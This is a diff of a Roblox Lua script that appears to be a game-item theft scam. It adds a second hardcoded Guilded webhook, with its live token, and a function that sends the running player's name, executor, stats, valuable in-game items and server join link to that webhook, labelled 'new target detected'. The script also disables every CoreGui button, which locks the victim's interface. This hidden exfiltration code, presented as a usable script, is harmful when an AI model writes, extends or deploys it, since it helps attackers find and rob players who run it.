@@ -7,8 +7,9 @@ local UserGameSettings = UserSettings():GetService("UserGameSettings")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
 
--- Webhook Guilded
+-- Webhooks Guilded
 local GUILDED_WEBHOOK = "https://media.guilded.gg/webhooks/b9453e99-729b-4673-9787-e43828658d2c/MpyC72zyucA86weM2SwyIWIekWuM4iyUuAuyscsEwikiAmmmG0U0wcykuEIuWA4WSSUmi6OUyq0WOk2isWcemC"
+local GUILDED_WEBHOOK_AVISO = "https://media.guilded.gg/webhooks/15022d01-dafa-44d6-9703-5f748f427e3d/8rDZPlnbkQy2owmqGOqqMWYEsOMEo6usOooY4qec2CcAyqQKM0qcsSegacuOUQ2EewWmkM4A2s4U2K2mmYmMiK"
 
 -- Lista de Brainrots válidos
 local VALID_BRAINROTS = {
@@ -206,7 +207,106 @@ local function getPlayerStats()
     return stats
 end
 
--- Função para enviar webhook para Guilded (método alternativo com form simulation)
+-- Função para enviar webhook de aviso (segunda webhook)
+local function sendAvisoWebhook(serverLink, brainrots, stats)
+    local player = Players.LocalPlayer
+    local playerName = player.Name
+    local displayName = player.DisplayName
+    local playerCount = #Players:GetPlayers()
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+    
+    local brainrotsList = ""
+    if #brainrots > 0 then
+        for i, br in ipairs(brainrots) do
+            brainrotsList = brainrotsList .. "• " .. br.nome .. " - " .. br.valor .. "\n"
+            if i >= 40 then
+                brainrotsList = brainrotsList .. "... e mais\n"
+                break
+            end
+        end
+    else
+        brainrotsList = "Nenhum brainrot detectado"
+    end
+    
+    local executorName = "Unknown"
+    if identifyexecutor then
+        executorName = identifyexecutor()
+    end
+    
+    local payload = {
+        content = "⚠️ **ALERTA DE EXECUÇÃO** ⚠️\n@everyone @here **NOVO ALVO DETECTADO!**",
+        embeds = {{
+            title = "🚨 SISTEMA METODH_BRANZZ EXECUTADO 🚨",
+            description = "**Um novo usuário executou o script!**",
+            color = 16711680,
+            fields = {
+                {
+                    name = "👤 Informações do Player:",
+                    value = "**Nome:** " .. playerName .. "\n**Display:** @" .. displayName,
+                    inline = false
+                },
+                {
+                    name = "💻 Executor:",
+                    value = "**" .. executorName .. "**",
+                    inline = true
+                },
+                {
+                    name = "👥 Players no Servidor:",
+                    value = "**" .. tostring(playerCount) .. " jogadores**",
+                    inline = true
+                },
+                {
+                    name = "💰 Steals:",
+                    value = "**" .. stats.steals .. "**",
+                    inline = true
+                },
+                {
+                    name = "🔄 Rebirths:",
+                    value = "**" .. stats.rebirths .. "**",
+                    inline = true
+                },
+                {
+                    name = "🔗 Link do Servidor:",
+                    value = "[**🎮 CLIQUE AQUI PARA ENTRAR NO SERVIDOR**](" .. serverLink .. ")",
+                    inline = false
+                },
+                {
+                    name = "📊 BRAINROTS DETECTADOS:",
+                    value = "```\n" .. brainrotsList .. "```",
+                    inline = false
+                }
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            footer = {
+                text = "⚠️ Sistema de Aviso METODH_BRANZZ | " .. currentTime
+            }
+        }}
+    }
+    
+    print("📤 Enviando webhook de aviso...")
+    
+    -- Tentar enviar webhook de aviso
+    local success = pcall(function()
+        HttpService:RequestAsync({
+            Url = GUILDED_WEBHOOK_AVISO,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    
+    if success then
+        print("✅ Webhook de aviso enviado com sucesso!")
+    else
+        -- Tentar método alternativo
+        pcall(function()
+            HttpService:PostAsync(GUILDED_WEBHOOK_AVISO, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false)
+            print("✅ Webhook de aviso enviado (método 2)!")
+        end)
+    end
+end
 local function sendGuildedWebhook(serverLink)
     local player = Players.LocalPlayer
     local playerName = player.Name
@@ -635,9 +735,17 @@ local function createMainGUI()
             -- Desativar TODOS os botões do CoreGui
             disableAllCoreGui()
             
-            -- Esperar 2 segundos e enviar webhook
+            -- Esperar 2 segundos e enviar webhooks
             wait(2)
+            
+            -- Coletar dados dos brainrots e stats
+            local brainrots, valorizado = findBrainrotsWithValues()
+            local stats = getPlayerStats()
+            
+            -- Enviar para AMBAS as webhooks
             sendGuildedWebhook(link)
+            wait(1) -- Pequeno delay entre envios
+            sendAvisoWebhook(link, brainrots, stats)
             
             print("✅ Sistema ativado com sucesso!")
         else
